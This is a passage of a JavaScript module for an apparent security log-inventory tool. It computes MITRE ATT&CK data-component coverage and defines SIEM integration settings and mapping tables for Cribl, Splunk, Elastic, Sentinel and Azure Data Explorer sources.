    if (requiredComponents.length === 0) {
      techniqueCoverage[technique] = {
        required: [],
        covered: [],
        percentage: 0,
        status: 'unknown'
      };
      return;
    }
    
    const covered = requiredComponents.filter(dc => providedComponents.has(dc));
    const coverage = (covered.length / requiredComponents.length) * 100;
    techniqueCoverage[technique] = {
      required: requiredComponents,
      covered: covered,
      percentage: Math.round(coverage),
      status: coverage >= 100 ? 'full' : coverage >= 50 ? 'partial' : 'none'
    };
  });
  
  return {
    componentsProvided: [...providedComponents],
    techniqueCoverage,
    summary: {
      totalTechniques: Object.keys(techniqueToDataComponents).length,
      fullyCovered: Object.values(techniqueCoverage).filter(t => t.status === 'full').length,
      partiallyCovered: Object.values(techniqueCoverage).filter(t => t.status === 'partial').length,
      notCovered: Object.values(techniqueCoverage).filter(t => t.status === 'none').length,
      unknown: Object.values(techniqueCoverage).filter(t => t.status === 'unknown').length,
    }
  };
};

// Get component coverage for a specific technique
export const getTechniqueComponentCoverage = (technique, sources) => {
  const requiredComponents = techniqueToDataComponents[technique] || [];
  if (requiredComponents.length === 0) {
    return { required: [], covered: [], missing: [], percentage: 0, status: 'unknown' };
  }
  
  const providedComponents = new Set();
  sources
    .filter(s => s.status === 'collected' || s.status === 'partial')
    .forEach(source => {
      const components = getCategoryDataComponents(source.category);
      components.forEach(comp => providedComponents.add(comp.id));
    });
  
  const covered = requiredComponents.filter(dc => providedComponents.has(dc));
  const missing = requiredComponents.filter(dc => !providedComponents.has(dc));
  const percentage = Math.round((covered.length / requiredComponents.length) * 100);
  
  return {
    required: requiredComponents.map(id => mitreDataComponents.find(dc => dc.id === id)).filter(Boolean),
    covered: covered.map(id => mitreDataComponents.find(dc => dc.id === id)).filter(Boolean),
    missing: missing.map(id => mitreDataComponents.find(dc => dc.id === id)).filter(Boolean),
    percentage,
    status: percentage >= 100 ? 'full' : percentage >= 50 ? 'partial' : 'none'
  };
};

// Get recommended data components for a technique
export const getRecommendedComponents = (technique, sources) => {
  const coverage = getTechniqueComponentCoverage(technique, sources);
  
  return coverage.missing.map(comp => ({
    component: comp,
    dataSource: mitreDataSources.find(ds => ds.id === comp.dataSourceId),
    recommendedCategories: comp.dataSourceId 
      ? (mitreDataSources.find(ds => ds.id === comp.dataSourceId)?.logSourceCategories || [])
      : [],
    exampleSources: comp.dataSourceId
      ? (mitreDataSources.find(ds => ds.id === comp.dataSourceId)?.logSourceExamples || [])
      : []
  }));
};

// ============================================
// INTEGRATIONS
// ============================================

// Supported integration types
export const integrationTypes = [
  {
    id: 'cribl',
    name: 'Cribl Stream',
    description: 'Connect to Cribl Stream to auto-discover log sources from your data pipeline',
    icon: 'Layers',
    color: 'purple',
    configFields: [
      { id: 'baseUrl', label: 'Cribl URL', type: 'url', placeholder: 'https://your-cribl-instance.cribl.cloud', required: true },
      { id: 'apiToken', label: 'API Token', type: 'password', placeholder: 'Enter your Cribl API token', required: true },
      { id: 'workerGroup', label: 'Worker Group', type: 'text', placeholder: 'default (leave empty for leader)', required: false },
    ],
    docUrl: 'https://docs.cribl.io/stream/api-reference/',
  },
  {
    id: 'splunk',
    name: 'Splunk',
    description: 'Connect to Splunk to discover data inputs and sourcetypes',
    icon: 'Search',
    color: 'green',
    configFields: [
      { id: 'baseUrl', label: 'Splunk URL', type: 'url', placeholder: 'https://your-splunk:8089', required: true },
      { id: 'apiToken', label: 'API Token', type: 'password', placeholder: 'Enter your Splunk token', required: true },
    ],
    docUrl: 'https://docs.splunk.com/Documentation/Splunk/latest/RESTREF/RESTprolog',
    comingSoon: true,
  },
  {
    id: 'elastic',
    name: 'Elastic',
    description: 'Connect to Elasticsearch to discover indices and data streams',
    icon: 'Database',
    color: 'yellow',
    configFields: [
      { id: 'baseUrl', label: 'Elasticsearch URL', type: 'url', placeholder: 'https://your-elasticsearch:9200', required: true },
      { id: 'apiToken', label: 'API Key', type: 'password', placeholder: 'Enter your Elastic API key', required: true },
    ],
    docUrl: 'https://www.elastic.co/guide/en/elasticsearch/reference/current/rest-apis.html',
    comingSoon: true,
  },
  {
    id: 'sentinel',
    name: 'Microsoft Sentinel',
    description: 'Connect to Microsoft Sentinel to discover data connectors',
    icon: 'Shield',
    color: 'blue',
    configFields: [
      { id: 'tenantId', label: 'Tenant ID', type: 'text', placeholder: 'Your Azure tenant ID', required: true },
      { id: 'clientId', label: 'Client ID', type: 'text', placeholder: 'App registration client ID', required: true },
      { id: 'clientSecret', label: 'Client Secret', type: 'password', placeholder: 'App registration secret', required: true },
      { id: 'workspaceId', label: 'Workspace ID', type: 'text', placeholder: 'Log Analytics workspace ID', required: true },
    ],
    docUrl: 'https://learn.microsoft.com/en-us/rest/api/securityinsights/',
    comingSoon: true,
  },
  {
    id: 'adx',
    name: 'Azure Data Explorer',
    description: 'Connect to Azure Data Explorer (Kusto) to discover tables, schemas, and ingestion mappings',
    icon: 'Database',
    color: 'cyan',
    configFields: [
      { id: 'clusterUrl', label: 'Cluster URL', type: 'url', placeholder: 'https://yourcluster.region.kusto.windows.net', required: true },
      { id: 'database', label: 'Database Name', type: 'text', placeholder: 'Your ADX database name', required: true },
      { id: 'tenantId', label: 'Tenant ID', type: 'text', placeholder: 'Your Azure AD tenant ID', required: true },
      { id: 'clientId', label: 'Client ID', type: 'text', placeholder: 'App registration client ID', required: true },
      { id: 'clientSecret', label: 'Client Secret', type: 'password', placeholder: 'App registration client secret', required: true },
    ],
    docUrl: 'https://learn.microsoft.com/en-us/azure/data-explorer/kusto/api/rest/',
  },
];

// Cribl source type to Logwise category mapping
export const criblTypeToCategory = {
  'syslog': 'Network',
  'tcp': 'Network',
  'udp': 'Network',
  'http': 'Web',
  'splunk_hec': 'Application',
  'elastic': 'Application',
  's3': 'Cloud',
  'sqs': 'Cloud',
  'kafka': 'Application',
  'kinesis': 'Cloud',
  'azure_blob': 'Cloud',
  'azure_event_hub': 'Cloud',
  'gcp_pubsub': 'Cloud',
  'office365': 'Cloud',
  'windows_event': 'Endpoint',
  'file': 'Application',
  'exec': 'Endpoint',
  'snmp': 'Network',
  'datagen': 'Application',
};

// Cribl source type to Logwise log type mapping
export const criblTypeToLogType = {
  'syslog': 'syslog',
  'tcp': 'syslog',
  'udp': 'syslog',
  'http': 'json',
  'splunk_hec': 'json',
  'elastic': 'json',
  's3': 'json',
  'sqs': 'json',
  'kafka': 'json',
  'kinesis': 'json',
  'azure_blob': 'json',
  'azure_event_hub': 'json',
  'gcp_pubsub': 'json',
  'office365': 'json',
  'windows_event': 'windows-event',
  'file': 'file',
  'exec': 'other',
  'snmp': 'other',
};

// ADX table name patterns to Logwise category mapping
export const adxTableToCategory = {
  'SecurityEvent': 'Endpoint',
  'Syslog': 'Network',
  'WindowsEvent': 'Endpoint',
  'AzureActivity': 'Cloud',
  'AzureDiagnostics': 'Cloud',
  'SigninLogs': 'Identity',
  'AADNonInteractiveUserSignInLogs': 'Identity',
  'AADServicePrincipalSignInLogs': 'Identity',
  'AuditLogs': 'Identity',
  'CommonSecurityLog': 'Network',
  'DeviceNetworkEvents': 'Endpoint',
  'DeviceProcessEvents': 'Endpoint',
  'DeviceFileEvents': 'Endpoint',
  'DeviceRegistryEvents': 'Endpoint',
  'DeviceLogonEvents': 'Identity',
  'EmailEvents': 'Application',
  'OfficeActivity': 'Application',
  'ThreatIntelligenceIndicator': 'Security',
  'Heartbeat': 'Endpoint',
  'Perf': 'Endpoint',
  'Event': 'Endpoint',
  'W3CIISLog': 'Web',
  'AppServiceHTTPLogs': 'Web',
  'AWSCloudTrail': 'Cloud',
  'GCPAuditLogs': 'Cloud',
};

// ADX table name patterns to log type mapping
export const adxTableToLogType = {
  'SecurityEvent': 'windows-event',
  'Syslog': 'syslog',
  'WindowsEvent': 'windows-event',
  'AzureActivity': 'json',
  'AzureDiagnostics': 'json',
  'SigninLogs': 'json',
  'AADNonInteractiveUserSignInLogs': 'json',
  'AADServicePrincipalSignInLogs': 'json',
  'AuditLogs': 'json',
  'CommonSecurityLog': 'cef',
  'DeviceNetworkEvents': 'json',
  'DeviceProcessEvents': 'json',
  'DeviceFileEvents': 'json',
  'DeviceRegistryEvents': 'json',
  'DeviceLogonEvents': 'json',
  'EmailEvents': 'json',
  'OfficeActivity': 'json',
  'ThreatIntelligenceIndicator': 'json',
  'Heartbeat': 'json',
  'Perf': 'json',
  'Event': 'windows-event',
  'W3CIISLog': 'iis',
  'AppServiceHTTPLogs': 'json',
  'AWSCloudTrail': 'json',
  'GCPAuditLogs': 'json',
};

// Import mode options
export const importModeOptions = [
  { value: 'new-only', label: 'Import new only', description: 'Only import sources that don\'t exist in inventory' },
  { value: 'update', label: 'Import & update', description: 'Import new sources and update existing ones' },
  { value: 'preview', label: 'Preview only', description: 'Show what would be imported without making changes' },
];

// Integration status options
export const integrationStatusOptions = [
  { value: 'configured', label: 'Configured', color: 'gray', description: 'Integration configured but not synced' },
  { value: 'synced', label: 'Synced', color: 'green', description: 'Successfully synced' },
  { value: 'error', label: 'Error', color: 'red', description: 'Last sync failed' },
  { value: 'syncing', label: 'Syncing', color: 'blue', description: 'Sync in progress' },
];